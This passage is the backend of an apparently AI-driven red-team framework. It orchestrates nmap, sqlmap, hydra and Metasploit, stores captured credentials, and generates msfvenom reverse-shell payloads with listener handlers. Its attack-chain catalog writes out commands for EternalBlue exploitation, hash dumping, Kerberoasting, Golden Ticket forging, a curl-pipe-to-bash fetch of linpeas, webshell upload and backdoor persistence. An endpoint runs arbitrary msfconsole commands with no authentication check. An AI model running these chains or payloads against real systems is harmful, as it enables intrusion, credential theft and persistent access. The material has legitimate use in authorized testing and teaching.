            tool_status[tool_name] = proc.returncode == 0
        except Exception:
            tool_status[tool_name] = False
    return {
        "status": "healthy" if db_ok else "degraded",
        "checks": {
            "database": {"engine": "sqlite", "path": config.db_path, "status": "connected" if db_ok else "error"},
            "ai": {"configured": bool(KIMI_API_KEY), "model": "kimi-k2"},
            "tools": tool_status,
            "listener": {"ip": global_config.get("listener_ip", ""), "port": global_config.get("listener_port", 4444), "configured": bool(global_config.get("listener_ip"))},
            "active_jobs": await jobs.list_active(),
        }
    }


@api_router.get("/doctor")
async def doctor():
    diag = {"database": {}, "ai": {}, "tools": {}, "config": {}, "hints": []}
    db_ok = await repo.is_healthy()
    diag["database"] = {"engine": "sqlite", "path": config.db_path, "healthy": db_ok}
    if not db_ok:
        diag["hints"].append("Database connection failed.")
    diag["config"] = {"mode": config.app_mode, "warnings": config.warnings, "errors": config.errors}
    for w in config.warnings:
        diag["hints"].append(f"Config: {w}")
    diag["ai"] = {"configured": bool(KIMI_API_KEY), "model": "kimi-k2-0711-preview"}
    if not KIMI_API_KEY:
        diag["hints"].append("KIMI_API_KEY not set. AI will use fallback rules (less intelligent scans).")
    tool_checks = {}
    for tool_name in ["nmap", "nikto", "nuclei", "sqlmap", "hydra", "msfconsole", "msfvenom", "gobuster", "whatweb", "wafw00f", "subfinder", "masscan", "sslscan"]:
        try:
            proc = await asyncio.create_subprocess_exec("which", tool_name, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            await asyncio.wait_for(proc.communicate(), timeout=2)
            tool_checks[tool_name] = proc.returncode == 0
        except Exception:
            tool_checks[tool_name] = False
    diag["tools"] = tool_checks
    missing = [t for t, ok in tool_checks.items() if not ok]
    if missing:
        diag["hints"].append(f"Missing tools: {', '.join(missing)}. Install: sudo apt install {' '.join(missing)}")
    if "nuclei" in missing:
        diag["hints"].append("Install Nuclei: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")
    return diag


# ============ JOB ENDPOINTS ============

@api_router.post("/jobs/{job_type}/start")
async def start_job(job_type: str, data: Dict[str, Any] = {}):
    target = data.get("target", "")
    if job_type == "scan":
        scan_id = str(uuid.uuid4())
        params = {"scan_id": scan_id, "phases": data.get("scan_phases", data.get("phases", ["reconnaissance", "initial_access"])), "tools": data.get("tools", [])}
        target = target.strip().replace("https://", "").replace("http://", "").split("/")[0]
        result = await jobs.submit("scan", scan_job_handler, target=target, params=params)
        result["scan_id"] = scan_id
        return result
    raise HTTPException(status_code=400, detail=f"Unknown job type: {job_type}")

@api_router.get("/jobs")
async def list_jobs(status: str = None, job_type: str = None):
    return {"jobs": await repo.job_list(status=status, job_type=job_type), "active_job_ids": await jobs.list_active()}

@api_router.get("/jobs/{job_id}")
async def get_job(job_id: str):
    result = await jobs.get_status(job_id)
    if not result:
        raise HTTPException(status_code=404, detail="Job not found")
    return result

@api_router.post("/jobs/{job_id}/cancel")
async def cancel_job(job_id: str):
    if await jobs.cancel(job_id):
        return {"status": "cancelled", "job_id": job_id}
    raise HTTPException(status_code=400, detail="Job not running")

@api_router.get("/jobs/{job_id}/logs")
async def get_job_logs(job_id: str, limit: int = 200):
    return {"job_id": job_id, "logs": await repo.job_logs_get(job_id, limit=limit)}


# ============ CONFIG ============

@api_router.get("/config")
async def get_config():
    return {**global_config}

@api_router.put("/config")
async def update_config(data: Dict[str, Any]):
    global global_config
    allowed = {"listener_ip", "listener_port", "c2_protocol", "operator_name", "stealth_mode", "auto_lhost"}
    global_config.update({k: v for k, v in data.items() if k in allowed})
    await repo.config_set("operator_config", global_config)
    return {"status": "updated", "config": {**global_config}}


# ============ SCAN ENDPOINTS ============

@api_router.post("/scan/start")
async def start_scan(scan: ScanCreate, background_tasks: BackgroundTasks):
    scan_id = str(uuid.uuid4())
    target = scan.target.strip().replace("https://", "").replace("http://", "").split("/")[0]
    params = {"scan_id": scan_id, "phases": scan.scan_phases, "tools": scan.tools}
    result = await jobs.submit("scan", scan_job_handler, target=target, params=params)
    return {"scan_id": scan_id, "job_id": result["job_id"], "target": target, "phases": scan.scan_phases, "status": "started"}

@api_router.get("/scan/{scan_id}/status")
async def get_scan_status(scan_id: str):
    if scan_id in scan_progress:
        p = scan_progress[scan_id]
        return {
            "scan_id": scan_id, "status": p["status"], "current_tool": p["current_tool"],
            "progress": p["progress"], "results": p["results"],
            "ai_decisions": p.get("ai_decisions", []),
            "ai_analysis": p.get("ai_analysis"),
            "attack_tree": p.get("attack_tree"),
            "vault_summary": p.get("vault_summary", {}),
            "timeline": p.get("timeline", []),
            "adaptive_log": p.get("adaptive_log", []),
        }
    scan = await repo.scan_get(scan_id)
    if scan:
        ai_data = scan.get("ai_analysis") or {}
        if isinstance(ai_data, str):
            try:
                ai_data = json.loads(ai_data)
            except Exception:
                ai_data = {"analysis": ai_data}
        return {
            "scan_id": scan_id, "status": scan["status"], "current_tool": None,
            "progress": 100, "results": scan.get("results", {}),
            "ai_decisions": [], "ai_analysis": ai_data.get("analysis") if isinstance(ai_data, dict) else ai_data,
            "attack_tree": scan.get("attack_tree"),
            "vault_summary": scan.get("vault", {}),
            "timeline": scan.get("timeline", []), "adaptive_log": [],
        }
    raise HTTPException(status_code=404, detail="Scan not found")

@api_router.get("/scan/{scan_id}/tree")
async def get_attack_tree(scan_id: str):
    if scan_id in attack_trees:
        return attack_trees[scan_id]
    scan = await repo.scan_get(scan_id)
    if scan and scan.get("attack_tree"):
        return scan["attack_tree"]
    raise HTTPException(status_code=404, detail="Tree not found")

@api_router.put("/scan/{scan_id}/tree/node/{node_id}")
async def update_tree_node(scan_id: str, node_id: str, update: UpdateNodeStatus):
    if scan_id not in attack_trees:
        scan = await repo.scan_get(scan_id)
        if scan and scan.get("attack_tree"):
            attack_trees[scan_id] = scan["attack_tree"]
        else:
            raise HTTPException(status_code=404, detail="Tree not found")
    tree = attack_trees[scan_id]
    if node_id in tree["nodes"]:
        tree["nodes"][node_id]["status"] = update.status
        await repo.scan_update(scan_id, attack_tree=tree)
    return {"message": "Updated"}

@api_router.get("/scan/history")
async def get_scan_history():
    return await repo.scan_list(limit=100)

@api_router.get("/scan/{scan_id}/report")
async def get_scan_report(scan_id: str):
    scan = await repo.scan_get(scan_id)
    if not scan:
        raise HTTPException(status_code=404, detail="Not found")
    return {"report": scan}

@api_router.get("/scan/{scan_id}/network_map")
async def get_network_map(scan_id: str):
    """Build network topology from scan results."""
    scan = await repo.scan_get(scan_id)
    if not scan:
        if scan_id in scan_progress:
            results = scan_progress[scan_id].get("results", {})
            target = ""
        else:
            raise HTTPException(status_code=404, detail="Scan not found")
    else:
        results = scan.get("results", {})
        target = scan.get("target", "")

    nodes = [{"id": "target", "label": target, "type": "target", "x": 400, "y": 50}]
    edges = []
    node_id = 0

    # Extract services from nmap/nmap_fast
    services_added = set()
    for tool_id in ["nmap_fast", "nmap"]:
        result = results.get(tool_id, {})
        if not isinstance(result, dict):
            continue
        for port_info in result.get("ports", []):
            port = port_info.get("port", "")
            service = port_info.get("service", "unknown")
            state = port_info.get("state", "")
            if port and port not in services_added:
                services_added.add(port)
                node_id += 1
                nid = f"svc_{node_id}"
                nodes.append({"id": nid, "label": f"{port}\n{service}", "type": "service", "port": port, "service": service, "state": state})
                edges.append({"from": "target", "to": nid})

    # Extract subdomains from subfinder
    subfinder = results.get("subfinder", {})
    if isinstance(subfinder, dict):
        for item in subfinder.get("items", [])[:15]:
            node_id += 1
            nid = f"sub_{node_id}"
            nodes.append({"id": nid, "label": item, "type": "subdomain"})
            edges.append({"from": "target", "to": nid})

    # Extract vulnerabilities from nuclei
    for tool_id in ["nuclei", "nuclei_full"]:
        result = results.get(tool_id, {})
        if not isinstance(result, dict):
            continue
        for finding in result.get("findings", [])[:10]:
            sev = finding.get("severity", "info")
            if sev in ("critical", "high", "medium"):
                node_id += 1
                nid = f"vuln_{node_id}"
                nodes.append({"id": nid, "label": finding.get("name", "Vuln")[:40], "type": "vulnerability", "severity": sev})
                # Connect to matching service or target
                matched = finding.get("matched_at", "")
                connected = False
                for svc_node in nodes:
                    if svc_node["type"] == "service" and svc_node.get("port", "") and svc_node["port"].split("/")[0] in matched:
                        edges.append({"from": svc_node["id"], "to": nid})
                        connected = True
                        break
                if not connected:
                    edges.append({"from": "target", "to": nid})

    # WAF info
    for tool_id in ["wafw00f"]:
        result = results.get(tool_id, {})
        if isinstance(result, dict) and result.get("waf") and result["waf"] != "None Detected":
            node_id += 1
            nid = f"waf_{node_id}"
            nodes.append({"id": nid, "label": f"WAF: {result['waf']}", "type": "waf"})
            edges.append({"from": "target", "to": nid})

    # Tech from whatweb
    whatweb = results.get("whatweb", {})
    if isinstance(whatweb, dict) and whatweb.get("output"):
        output = whatweb["output"][:300]
        techs = re.findall(r'\[([^\]]+)\]', output)[:5]
        for tech in techs:
            if len(tech) > 3 and len(tech) < 30:
                node_id += 1
                nid = f"tech_{node_id}"
                nodes.append({"id": nid, "label": tech, "type": "technology"})
                edges.append({"from": "target", "to": nid})

    return {"nodes": nodes, "edges": edges, "target": target}

@api_router.get("/scan/{scan_id}/report/pdf")
async def get_scan_report_pdf(scan_id: str):
    scan = await repo.scan_get(scan_id)
    if not scan:
        raise HTTPException(status_code=404, detail="Not found")
    pdf = FPDF()
    pdf.set_auto_page_break(auto=True, margin=15)
    pdf.add_page()
    pdf.set_font("Courier", "B", 18)
    pdf.cell(0, 12, "RED TEAM - REPORTE DE OPERACION", ln=True, align="C")
    pdf.set_font("Courier", "", 10)
    pdf.cell(0, 8, f"Target: {scan.get('target', 'N/A')}", ln=True, align="C")
    pdf.cell(0, 8, f"Fecha: {scan.get('created_at', 'N/A')}", ln=True, align="C")
    pdf.line(10, pdf.get_y(), 200, pdf.get_y())
    pdf.ln(5)
    results = scan.get("results", {})
    if results:
        pdf.set_font("Courier", "B", 12)
        pdf.cell(0, 10, "RESULTADOS POR HERRAMIENTA", ln=True)
        for tool_name, tool_result in (results.items() if isinstance(results, dict) else []):
            pdf.set_font("Courier", "B", 10)
            pdf.cell(0, 8, f">>> {tool_name.upper()}", ln=True)
            pdf.set_font("Courier", "", 9)
            if isinstance(tool_result, dict):
                if tool_result.get("ports"):
                    for p in tool_result["ports"][:15]:
                        pdf.cell(0, 6, f"  {p.get('port','?')} - {p.get('state','?')} - {p.get('service','?')}", ln=True)
                if tool_result.get("findings"):
                    for f in tool_result["findings"][:10]:
                        pdf.cell(0, 6, sanitize_for_pdf(f"  [{f.get('severity','?')}] {f.get('name', f.get('finding',''))[:80]}"), ln=True)
                if tool_result.get("vulnerabilities"):
                    for v in tool_result["vulnerabilities"][:10]:
                        pdf.cell(0, 6, sanitize_for_pdf(f"  [{v.get('severity','?')}] {v.get('finding','')[:80]}"), ln=True)
            pdf.ln(2)
    ai_data = scan.get("ai_analysis")
    if ai_data:
        if isinstance(ai_data, str):
            try:
                ai_data = json.loads(ai_data)
            except Exception:
                ai_data = {"analysis": ai_data}
        analysis_text = ai_data.get("analysis", "") if isinstance(ai_data, dict) else str(ai_data)
        if analysis_text:
            pdf.add_page()
            pdf.set_font("Courier", "B", 14)
            pdf.cell(0, 10, "ANALISIS AI", ln=True)
            pdf.set_font("Courier", "", 9)
            for line in analysis_text.split('\n'):
                pdf.cell(0, 5, sanitize_for_pdf(line[:120]), ln=True)
    pdf.ln(5)
    pdf.set_font("Courier", "I", 9)
    pdf.cell(0, 7, "Generado por Red Team Framework v7.0 AI-Driven", ln=True, align="C")
    buffer = io.BytesIO(pdf.output())
    buffer.seek(0)
    return StreamingResponse(buffer, media_type="application/pdf", headers={"Content-Disposition": f"attachment; filename=redteam-{scan.get('target','')}-{scan_id[:8]}.pdf"})

@api_router.delete("/scan/{scan_id}")
async def delete_scan(scan_id: str):
    await repo.scan_delete(scan_id)
    scan_progress.pop(scan_id, None)
    attack_trees.pop(scan_id, None)
    return {"message": "Deleted"}

@api_router.get("/scan/{scan_id}/vault")
async def get_scan_vault(scan_id: str):
    return {"summary": credential_vault.get_vault_summary(scan_id), "credentials": credential_vault.get_credentials(scan_id), "context": credential_vault.get_context(scan_id)}

@api_router.get("/scan/{scan_id}/timeline")
async def get_scan_timeline(scan_id: str):
    if scan_id in scan_progress:
        return {"timeline": scan_progress[scan_id].get("timeline", []), "ai_decisions": scan_progress[scan_id].get("ai_decisions", [])}
    scan = await repo.scan_get(scan_id)
    if scan:
        return {"timeline": scan.get("timeline", []), "ai_decisions": []}
    raise HTTPException(status_code=404, detail="Not found")

@api_router.post("/scan/{scan_id}/abort")
async def abort_scan(scan_id: str):
    if scan_id in scan_progress and scan_progress[scan_id]["status"] == "running":
        scan_progress[scan_id]["status"] = "aborted"
        return {"status": "aborted"}
    raise HTTPException(status_code=400, detail="Not running")


# ============ TOOLS & MITRE ============

@api_router.get("/mitre/tactics")
async def get_mitre_tactics():
    return {"tactics": MITRE_TACTICS}

@api_router.get("/tools")
async def get_tools(phase: str = None):
    tools = {k: v for k, v in RED_TEAM_TOOLS.items() if not phase or v["phase"] == phase}
    return {"tools": tools}

@api_router.post("/tools/add")
async def add_custom_tool(data: Dict[str, Any]):
    tool_id = data.get("id", "").lower().replace(" ", "_")
    if not tool_id or not data.get("cmd"):
        raise HTTPException(status_code=400, detail="id and cmd required")
    RED_TEAM_TOOLS[tool_id] = {"phase": data.get("phase", "reconnaissance"), "mitre": data.get("mitre", ""), "cmd": data.get("cmd"), "desc": data.get("desc", "Custom tool"), "parser": "generic"}
    await repo.custom_tool_upsert(tool_id, data.get("phase", "reconnaissance"), data.get("mitre", ""), data.get("cmd"), data.get("desc", "Custom tool"))
    return {"status": "added", "tool": RED_TEAM_TOOLS[tool_id]}

@api_router.delete("/tools/{tool_id}")
async def remove_custom_tool(tool_id: str):
    if tool_id in RED_TEAM_TOOLS:
        del RED_TEAM_TOOLS[tool_id]
        await repo.custom_tool_delete(tool_id)
        return {"status": "removed"}
    raise HTTPException(status_code=404, detail="Not found")


# ============ METASPLOIT CLI (direct, no RPC) ============

# Attack Chain catalog (no C2/RPC dependency)
ATTACK_CHAINS = {
    "web_to_shell": {"name": "Web App to Shell", "description": "SQLi/RCE -> Credential Dump -> Persistence", "triggers": ["sql injection", "rce", "command injection"], "steps_count": 4},
    "smb_to_domain": {"name": "SMB to Domain Admin", "description": "EternalBlue/Creds -> Hashdump -> Lateral -> DC", "triggers": ["smb", "445", "ms17-010"], "steps_count": 4},
    "kerberos_attack": {"name": "Kerberos Attack Chain", "description": "User Enum -> AS-REP -> Kerberoast -> Golden Ticket", "triggers": ["kerberos", "88", "active directory"], "steps_count": 5},
    "linux_privesc": {"name": "Linux Privilege Escalation", "description": "Shell -> Enum -> Exploit -> Root", "triggers": ["linux", "shell", "ssh"], "steps_count": 4},
    "windows_privesc": {"name": "Windows Privilege Escalation", "description": "Shell -> Enum -> Exploit -> SYSTEM", "triggers": ["windows", "shell", "rdp", "winrm"], "steps_count": 4},
    "phishing_to_shell": {"name": "Phishing to Internal Access", "description": "Phish -> Macro -> Beacon -> Pivot", "triggers": ["phishing", "email", "social"], "steps_count": 4},
}

@api_router.get("/chains")
async def get_chains():
    chains = [{"id": cid, **c} for cid, c in ATTACK_CHAINS.items()]
    return {"chains": chains}

@api_router.get("/chains/{chain_id}")
async def get_chain_detail(chain_id: str):
    chain = ATTACK_CHAINS.get(chain_id)
    if not chain:
        raise HTTPException(status_code=404, detail="Chain not found")
    # Build steps from chain definition
    steps = _build_chain_steps(chain_id, chain)
    return {"id": chain_id, **chain, "steps": steps}

@api_router.post("/chains/execute")
async def execute_chain(data: Dict[str, Any]):
    chain_id = data.get("chain_id", "")
    chain = ATTACK_CHAINS.get(chain_id)
    if not chain:
        raise HTTPException(status_code=404, detail="Chain not found")
    target = data.get("target", "")
    context = data.get("context", {})
    exec_id = str(uuid.uuid4())[:8]
    steps = _build_chain_steps(chain_id, chain)
    return {
        "execution_id": exec_id, "chain_id": chain_id, "status": "prepared",
        "target": target, "total_steps": len(steps), "progress": 0,
        "steps": steps, "step_statuses": {str(s["id"]): {"status": "pending"} for s in steps}
    }

@api_router.get("/chains/execution/{exec_id}")
async def get_chain_execution(exec_id: str):
    return {"execution_id": exec_id, "status": "prepared", "progress": 0}

@api_router.post("/chains/execution/{exec_id}/step/{step_id}")
async def run_chain_step(exec_id: str, step_id: str):
    return {"execution_id": exec_id, "step_id": step_id, "status": "completed"}

def _build_chain_steps(chain_id: str, chain: Dict) -> list:
    """Generate actionable steps for a chain."""
    step_defs = {
        "web_to_shell": [
            {"id": 1, "name": "Web Recon", "actions": [{"tool": "whatweb", "cmd": "whatweb {target}"}, {"tool": "nikto", "cmd": "nikto -h {target}"}]},
            {"id": 2, "name": "Vuln Scan", "actions": [{"tool": "nuclei", "cmd": "nuclei -u {target} -severity critical,high"}, {"tool": "sqlmap", "cmd": "sqlmap -u '{target}' --batch"}]},
            {"id": 3, "name": "Exploit", "actions": [{"tool": "msfconsole", "cmd": "use exploit/multi/http/; set RHOSTS {target}; run"}]},
            {"id": 4, "name": "Persist", "actions": [{"tool": "shell", "cmd": "crontab -e / webshell upload"}]},
        ],
        "smb_to_domain": [
            {"id": 1, "name": "SMB Enum", "actions": [{"tool": "nmap", "cmd": "nmap -p445 --script smb-vuln* {target}"}]},
            {"id": 2, "name": "EternalBlue", "actions": [{"tool": "msfconsole", "cmd": "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; run"}]},
            {"id": 3, "name": "Hashdump", "actions": [{"tool": "meterpreter", "cmd": "hashdump / secretsdump.py"}]},
            {"id": 4, "name": "Lateral", "actions": [{"tool": "psexec", "cmd": "psexec.py / wmiexec.py DOMAIN/user@DC"}]},
        ],
        "kerberos_attack": [
            {"id": 1, "name": "User Enum", "actions": [{"tool": "kerbrute", "cmd": "kerbrute userenum -d DOMAIN users.txt"}]},
            {"id": 2, "name": "AS-REP Roast", "actions": [{"tool": "impacket", "cmd": "GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass"}]},
            {"id": 3, "name": "Kerberoast", "actions": [{"tool": "impacket", "cmd": "GetUserSPNs.py DOMAIN/user:pass -request"}]},
            {"id": 4, "name": "Crack Hashes", "actions": [{"tool": "hashcat", "cmd": "hashcat -m 13100 hashes.txt wordlist.txt"}]},
            {"id": 5, "name": "Golden Ticket", "actions": [{"tool": "impacket", "cmd": "ticketer.py -nthash KRBTGT_HASH -domain DOMAIN admin"}]},
        ],
        "linux_privesc": [
            {"id": 1, "name": "Shell Access", "actions": [{"tool": "ssh/reverse", "cmd": "ssh user@{target} / reverse shell"}]},
            {"id": 2, "name": "Enumerate", "actions": [{"tool": "linpeas", "cmd": "curl -L linpeas.sh | bash"}, {"tool": "manual", "cmd": "sudo -l; find / -perm -4000 2>/dev/null"}]},
            {"id": 3, "name": "Exploit", "actions": [{"tool": "exploit", "cmd": "SUID/sudo/kernel exploit"}]},
            {"id": 4, "name": "Root", "actions": [{"tool": "persistence", "cmd": "Add SSH key / backdoor"}]},
        ],
        "windows_privesc": [
            {"id": 1, "name": "Shell Access", "actions": [{"tool": "rdp/winrm", "cmd": "evil-winrm -i {target} -u user -p pass"}]},
            {"id": 2, "name": "Enumerate", "actions": [{"tool": "winpeas", "cmd": "winPEASx64.exe"}, {"tool": "manual", "cmd": "whoami /priv; systeminfo"}]},
            {"id": 3, "name": "Exploit", "actions": [{"tool": "exploit", "cmd": "Token impersonation / service exploit"}]},
            {"id": 4, "name": "SYSTEM", "actions": [{"tool": "persistence", "cmd": "Add admin user / scheduled task"}]},
        ],
        "phishing_to_shell": [
            {"id": 1, "name": "Phish", "actions": [{"tool": "gophish", "cmd": "Setup phishing campaign"}, {"tool": "msfvenom", "cmd": "msfvenom -p windows/x64/meterpreter/reverse_https ..."}]},
            {"id": 2, "name": "Macro/Payload", "actions": [{"tool": "macro", "cmd": "Embed payload in doc/xls"}]},
            {"id": 3, "name": "Beacon", "actions": [{"tool": "handler", "cmd": "msfconsole -x 'use multi/handler; exploit -j'"}]},
            {"id": 4, "name": "Pivot", "actions": [{"tool": "proxychains", "cmd": "Setup SOCKS proxy / pivot to internal"}]},
        ],
    }
    return step_defs.get(chain_id, [{"id": 1, "name": "Execute", "actions": [{"tool": "manual", "cmd": "Execute chain manually"}]}])


@api_router.post("/payloads/recommend")
async def recommend_payloads(data: Dict[str, Any]):
    """AI recommends payloads based on scan results."""
    scan_id = data.get("scan_id", "")
    scan = await repo.scan_get(scan_id) if scan_id else None
    results = scan.get("results", {}) if scan else data.get("results", {})

    recommendations = []
    detected_os = None
    detected_services = []

    for tool_id, result in results.items():
        if not isinstance(result, dict):
            continue
        if result.get("os_detection"):
            os_text = result["os_detection"].lower()
            if "windows" in os_text:
                detected_os = "windows"
            elif "linux" in os_text:
                detected_os = "linux"
        for port_info in result.get("ports", []):
            svc = port_info.get("service", "").lower()
            if svc:
                detected_services.append(svc)
        raw = (result.get("raw", "") or result.get("output", "") or "").lower()
        if "php" in raw or "apache" in raw:
            detected_services.append("php")
        if "wordpress" in raw:
            detected_services.append("wordpress")

    # Recommend based on findings
    for pid, pt in PAYLOAD_TEMPLATES.items():
        score = 0
        reason = ""
        if detected_os == pt["platform"] or pt["platform"] == "any":
            score += 2
            reason = f"OS detectado: {detected_os or 'desconocido'}"
        if pt["platform"] == "php" and "php" in detected_services:
            score += 5
            reason = "PHP detectado en el target"
        if pt["platform"] == "linux" and any(s in detected_services for s in ["ssh", "ftp"]):
            score += 3
            reason = "Servicios Linux detectados (SSH/FTP)"
        if pt["platform"] == "windows" and any(s in detected_services for s in ["smb", "rdp", "winrm"]):
            score += 3
            reason = "Servicios Windows detectados (SMB/RDP)"
        if pt["type"] == "oneliner":
            score += 1
        if score > 0:
            recommendations.append({"payload_id": pid, "name": pt["name"], "score": score, "reason": reason, "platform": pt["platform"], "type": pt["type"]})

    recommendations.sort(key=lambda x: x["score"], reverse=True)
    return {"recommendations": recommendations[:5], "detected_os": detected_os, "detected_services": list(set(detected_services))[:10]}

@api_router.get("/chains/{chain_id}/suggest")
async def suggest_chains_for_scan(chain_id: str):
    """Suggest chains based on scan results (chain_id is actually scan_id here)."""
    scan_id = chain_id
    scan = await repo.scan_get(scan_id)
    results = scan.get("results", {}) if scan else scan_progress.get(scan_id, {}).get("results", {})
    if not results:
        return {"suggestions": []}

    # Analyze results to find matching triggers
    all_text = ""
    for result in results.values():
        if isinstance(result, dict):
            all_text += json.dumps(result, default=str).lower()

    suggestions = []
    for cid, chain in ATTACK_CHAINS.items():
        match_count = sum(1 for trigger in chain.get("triggers", []) if trigger.lower() in all_text)
        if match_count > 0:
            suggestions.append({"id": cid, "name": chain["name"], "description": chain["description"],
                "match_score": match_count, "steps_count": chain["steps_count"],
                "matched_triggers": [t for t in chain.get("triggers", []) if t.lower() in all_text]})
    suggestions.sort(key=lambda x: x["match_score"], reverse=True)
    return {"suggestions": suggestions}

@api_router.post("/msf/run")
async def msf_run_commands(data: Dict[str, Any]):
    """Run msfconsole commands directly via CLI."""
    commands = data.get("commands", "")
    if not commands:
        raise HTTPException(status_code=400, detail="commands required")
    timeout = min(data.get("timeout", 120), 300)
    result = await run_msfconsole(commands, timeout=timeout)
    return result

@api_router.get("/msf/status")
async def msf_status():
    """Check if msfconsole is available."""
    try:
        proc = await asyncio.create_subprocess_exec("which", "msfconsole", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        await asyncio.wait_for(proc.communicate(), timeout=2)
        installed = proc.returncode == 0
    except Exception:
        installed = False
    return {"installed": installed, "mode": "cli", "hint": "Metasploit runs as CLI (msfconsole -x). No msfrpcd needed."}


# ============ PAYLOADS ============

@api_router.get("/payloads/templates")
async def get_payload_templates():
    lhost = get_effective_lhost()
    lport = str(global_config.get("listener_port", 4444))
    templates = []
    for pid, pt in PAYLOAD_TEMPLATES.items():
        templates.append({
            "id": pid, "name": pt["name"], "platform": pt["platform"], "arch": pt["arch"],
            "type": pt["type"], "description": pt["description"],
            "generator_cmd": pt["generator"].format(lhost=lhost or "YOUR_IP", lport=lport, output=f"payload.{pt['output_ext'] or 'txt'}", platform=pt["platform"], arch=pt["arch"]),
            "handler_cmd": pt["handler"].format(lhost=lhost or "YOUR_IP", lport=lport),
            "lhost_configured": bool(lhost),
        })
    return {"payloads": templates, "global_lhost": lhost, "global_lport": lport}

@api_router.post("/payloads/generate")
async def generate_payload(data: Dict[str, Any]):
    payload_id = data.get("payload_id", "")
    template = PAYLOAD_TEMPLATES.get(payload_id)
    if not template:
        raise HTTPException(status_code=404, detail=f"Unknown payload: {payload_id}")
    lhost = data.get("lhost") or get_effective_lhost()
    lport = str(data.get("lport") or global_config.get("listener_port", 4444))
    platform = data.get("platform", template["platform"])
    arch = data.get("arch", template["arch"])
    output_name = data.get("output", f"payload_{payload_id.replace('/', '_')}.{template['output_ext'] or 'txt'}")
    if not lhost:
        raise HTTPException(status_code=400, detail="LHOST not configured.")
    generator_cmd = template["generator"].format(lhost=lhost, lport=lport, output=output_name, platform=platform, arch=arch)
    handler_cmd = template["handler"].format(lhost=lhost, lport=lport)
    result = {"payload_id": payload_id, "name": template["name"], "type": template["type"], "lhost": lhost, "lport": lport, "generator_cmd": generator_cmd, "handler_cmd": handler_cmd, "output_file": output_name if template["output_ext"] else None}
    if template["type"] == "oneliner":
        result["payload_content"] = generator_cmd
        return result
    if template["type"] in ("staged", "stageless"):
        try:
            output_path = f"/tmp/{output_name}"
            proc = await asyncio.create_subprocess_shell(generator_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            try:
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
            except asyncio.TimeoutError:
                proc.kill()
                return {**result, "generated": False, "error": "Timeout (120s)"}
            if proc.returncode == 0 and os.path.exists(output_path):
                result["generated"] = True
                result["file_size"] = os.path.getsize(output_path)
            else:
                result["generated"] = False
                result["error"] = (stderr.decode(errors='replace') if stderr else "Failed")[:300]
        except Exception as e:
            result["generated"] = False
            result["error"] = str(e)
    return result


# ============ WEBSOCKET ============

@api_router.websocket("/ws/scan/{scan_id}")
async def websocket_scan(websocket: WebSocket, scan_id: str):
    await websocket.accept()
    if scan_id not in active_connections:
        active_connections[scan_id] = []
    active_connections[scan_id].append(websocket)
    try:
        while True:
            if scan_id in scan_progress:
                p = scan_progress[scan_id]
                await websocket.send_json({
                    "type": "scan_update", "scan_id": scan_id, "status": p["status"],
                    "progress": p["progress"], "current_tool": p["current_tool"],
                    "results": p["results"], "ai_decisions": p.get("ai_decisions", []),
                })
                if p["status"] in ["completed", "error"]:
                    break
            await asyncio.sleep(1)
    except Exception:
        pass
    finally:
        if scan_id in active_connections and websocket in active_connections[scan_id]:
            active_connections[scan_id].remove(websocket)
        try:
            await websocket.close()
        except Exception:
            pass


# =============================================================================
# STARTUP / SHUTDOWN
# =============================================================================
app.include_router(api_router)
app.add_middleware(CORSMiddleware, allow_credentials=True, allow_origins=config.cors_origins.split(','), allow_methods=["*"], allow_headers=["*"])

@app.on_event("startup")
async def startup():
    logger.info(f"Initializing SQLite: {config.db_path}")
    await repo.init(config.db_path)
    await load_global_config()
    custom_tools = await repo.custom_tools_list()
    for t in custom_tools:
        RED_TEAM_TOOLS[t["id"]] = {"phase": t.get("phase", ""), "mitre": t.get("mitre", ""), "cmd": t.get("cmd", ""), "desc": t.get("description", ""), "parser": "generic"}
    logger.info(f"Red Team Framework v7.0 AI-Driven started [mode={config.app_mode}]")

@app.on_event("shutdown")
async def shutdown():
    logger.info("Shutting down...")
    await jobs.cleanup()
    await repo.close()
